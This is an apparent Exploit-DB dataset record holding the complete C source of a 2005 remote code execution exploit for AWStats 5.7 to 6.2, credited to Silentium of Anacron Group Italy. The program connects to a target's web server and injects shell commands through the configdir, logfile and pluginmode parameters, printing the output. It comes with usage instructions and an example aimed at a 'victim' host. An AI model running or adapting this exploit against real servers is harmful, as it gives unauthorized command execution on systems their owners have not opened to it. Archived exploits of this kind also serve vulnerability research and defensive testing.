{
  "id": "840",
  "title": "AWStats 5.7 &lt; 6.2 - Multiple Remote",
  "cve": null,
  "vuln_type": "rce",
  "code": "/****************************************************\r\n*                                                   *\r\n* AWStats v5.7 - v6.2                               *\r\n*                                                   *\r\n* sileAWSxpl                                        *\r\n* This exploit utilize three methods for exploiter  *\r\n* the vulnerability found on AWStats software.      *\r\n* an user can execute remote code on vulnerable     *\r\n* machine, with httpd privileges.                   *\r\n*                                                   *\r\n* References: www.securityfocus.org/bid/12543       *\r\n*                                                   *\r\n*  coded by: Silentium of Anacron Group Italy       *\r\n*      date: 24/02/2005                             *\r\n*    e-mail: anacrongroupitaly[at]autistici[dot]org *\r\n*   my_home: www.autistici.org/anacron-group-italy  *\r\n*                                                   *\r\n* this tool is developed under GPL license          *\r\n* no(c) .:. copyleft                                *\r\n*                                                   *\r\n****************************************************/\r\n\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <sys/types.h>\r\n#include <sys/socket.h>\r\n#include <netinet/in.h>\r\n#include <netdb.h>\r\n\r\n#define PORT 80                         // port of the web server\r\n#define CMDB 512                        // buffer length for commands\r\n#define BUFF 6000                       // buffer length for output's commands\r\n#define BANSTART \"SILENTIUM\"\r\n#define BANSTOP  \"anacron_group_italy\"\r\n\r\nvoid info(void);\r\nvoid sendxpl(FILE *out, char *argv[], int type);\r\nvoid readout(int sock, char *argv[]);\r\nvoid errgeth(void);\r\nvoid errsock(void);\r\nvoid errconn(void);\r\nvoid errsplo(void);\r\nvoid errbuff(void);\r\n\r\nint main(int argc, char *argv[]){\r\n\r\nFILE *out;\r\nint sock, sockconn, type;\r\nstruct sockaddr_in addr;\r\nstruct hostent *hp;\r\n\r\nif(argc != 5)\r\n  info();\r\n\r\ntype = atoi(argv[4]);\r\n\r\nif(type < 0 || type > 3)\r\n  info();\r\n\r\nif((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)\r\n  errsock();\r\n\r\n  system(\"clear\");\r\n  printf(\"[*] Creating socket          [OK]\\n\");\r\n\r\nif((hp = gethostbyname(argv[1])) == NULL)\r\n  errgeth();\r\n\r\n  printf(\"[*] Resolving victim host    [OK]\\n\");\r\n\r\nmemset(&addr,0,sizeof(addr));\r\nmemcpy((char *)&addr.sin_addr,hp->h_addr,hp->h_length);\r\naddr.sin_family = AF_INET;\r\naddr.sin_port = htons(PORT);\r\n\r\nsockconn = connect(sock, (struct sockaddr *)&addr, sizeof(addr));\r\nif(sockconn < 0)\r\n  errconn();\r\n\r\n  printf(\"[*] Connecting at victim host   [OK]\\n\",argv[1]);\r\n\r\nout = fdopen(sock,\"a\");\r\nsetbuf(out,NULL);\r\n\r\nsendxpl(out, argv, type);\r\n\r\n  printf(\"[*] Sending exploit          [OK]\\n\");\r\n\r\nreadout(sock, argv);\r\n\r\nshutdown(sock, 2);\r\nclose(sock);\r\nfclose(out);\r\n\r\nreturn(0);\r\n\r\n}\r\n\r\nvoid info(void){\r\n\r\nsystem(\"clear\");\r\nprintf(\"#########################################\\n\"\r\n      \"# AWStats v5.7 - v6.2                   #\\n\"\r\n      \"# Remote Code Execution                 #\\n\"\r\n      \"# exploit coded by Silentium            #\\n\"\r\n      \"# Anacron Group Italy                   #\\n\"\r\n      \"# www.autistici.org/anacron-group-italy #\\n\"\r\n      \"#########################################\\n\\n\"\r\n      \"[Usage]\\n\\n\"\r\n      \" sileAWSxpl <victim> <path_awstats> <cmd> <type>\\n\\n\"\r\n      \"        [Type]\\n\"\r\n      \"               1) ?configdir=|cmd|\\n\"\r\n      \"               2) ?update=1&logfile=|cmd|\\n\"\r\n      \"               3) ?pluginmode=:system(\\\"cmd\\\");\\n\\n\"\r\n      \"[example]\\n\\n\"\r\n      \" sileAWSxpl www.victim.com /cgi-bin/awstats.pl \\\"uname -a\\\" 3\\n\\n\");\r\nexit(1);\r\n\r\n}\r\n\r\nvoid sendxpl(FILE *out, char *argv[], int type){\r\n\r\nchar cmd[CMDB], cmd2[CMDB*3], cc;\r\nchar *hex = \"0123456789abcdef\";\r\nint i, j = 0, size;\r\n\r\nsize = strlen(argv[3]);\r\nstrncpy(cmd,argv[3],size);\r\n/*** Url Encoding Mode ON ***/\r\n\r\nfor(i = 0; i < size; i++){\r\n   cc = cmd[i];\r\n   if(cc >= 'a' && cc <= 'z'\r\n   || cc >= 'A' && cc <= 'Z'\r\n   || cc >= '0' && cc <= '9'\r\n   || cc == '-' || cc == '_' || cc == '.')\r\n   cmd2[j++] = cc ;\r\n else{\r\n      cmd2[j++] = '%';\r\n      cmd2[j++] = hex[cc >> 4];\r\n      cmd2[j++] = hex[cc & 0x0f];\r\n     }\r\n}\r\n\r\ncmd2[j] = '\\0';\r\n\r\n/*** Url Encoding Mode OFF ;P ***/\r\n\r\nif(type==1)\r\n  fprintf(out,\"GET %s?configdir=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\\n\"\r\n              \"Connection: Keep-Alive\\n\"\r\n              \"Accept: text/html, image/jpeg, image/png, text/*, image/*,*/*\\n\"\r\n              \"Accept-Encoding: x-gzip, x-deflate, gzip, deflate, identity\\n\"\r\n              \"Accept-Charset: iso-8859-1, utf-8;q=0.5, *;q=0.5\\n\"\r\n              \"Accept-Language: en\\n\"\r\n              \"Host: %s\\n\\n\",argv[2],BANSTART,cmd2,BANSTOP,argv[1]);\r\nelse if(type==2)\r\n  fprintf(out,\"GET %s?update=1&logfile=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\\n\"\r\n              \"Connection: Keep-Alive\\n\"\r\n              \"Accept: text/html, image/jpeg, image/png, text/*, image/*,\r\n*/*\\n\"\r\n              \"Accept-Encoding: x-gzip, x-deflate, gzip, deflate, identity\\n\"\r\n              \"Accept-Charset: iso-8859-1, utf-8;q=0.5, *;q=0.5\\n\"\r\n              \"Accept-Language: en\\n\"\r\n              \"Host: %s\\n\\n\",argv[2],BANSTART,cmd2,BANSTOP,argv[1]);\r\nelse if(type==3)\r\n  fprintf(out,\"GET %s?pluginmode=:system(\\\"echo+%s;%s;echo+%s\\\"); HTTP/1.0\\n\"\r\n              \"Connection: Keep-Alive\\n\"\r\n              \"Accept: text/html, image/jpeg, image/png, text/*, image/*,\r\n*/*\\n\"\r\n              \"Accept-Encoding: x-gzip, x-deflate, gzip, deflate, identity\\n\"\r\n              \"Accept-Charset: iso-8859-1, utf-8;q=0.5, *;q=0.5\\n\"\r\n              \"Accept-Language: en\\n\"\r\n              \"Host: %s\\n\\n\",argv[2],BANSTART,cmd2,BANSTOP,argv[1]);\r\n\r\n}\r\n\r\nvoid readout(int sock, char *argv[]){\r\n\r\nint i=0, flag;\r\nchar output[BUFF], tmp;\r\nprintf(\"[*] Output by %s:\\n\\n\",argv[1]);\r\n\r\nwhile(strstr(output,BANSTART) == NULL){\r\nflag = read(sock,&tmp,1);\r\noutput[i++] = tmp;\r\nif(i >= BUFF)\r\n  errbuff();\r\nif(flag==0)\r\n  errsplo();\r\n}\r\nwhile(strstr(output,BANSTOP) == NULL){\r\nread(sock,&tmp,1);\r\noutput[i++] = tmp;\r\nputchar(tmp);\r\nif(i >= BUFF)\r\n  errbuff();\r\n}\r\nprintf(\"\\n\\n\");\r\n\r\n}\r\n\r\nvoid errsock(void){\r\n\r\nsystem(\"clear\");\r\nprintf(\"[x] Creating socket             [FAILED]\\n\\n\");\r\nexit(1);\r\n\r\n}\r\n\r\nvoid errgeth(void){\r\n\r\nprintf(\"[x] Resolving victim host       [FAILED]\\n\\n\");\r\nexit(1);\r\n\r\n}\r\n\r\nvoid errconn(void){\r\n\r\nprintf(\"[x] Connecting at victim host   [FAILED]\\n\\n\");\r\nexit(1);\r\n\r\n}\r\n\r\nvoid errsplo(void){\r\n\r\nprintf(\"[x] Exploiting victim host      [FAILED]\\n\\n\");\r\nexit(1);\r\n\r\n}\r\n\r\nvoid errbuff(void){\r\n\r\nprintf(\"[x] Your buffer for output's command is FULL !!!\\n\\n\");\r\nexit(1);\r\n\r\n}\r\n\r\n// milw0rm.com [2005-02-24]",
  "url": "https://www.exploit-db.com/exploits/840"
}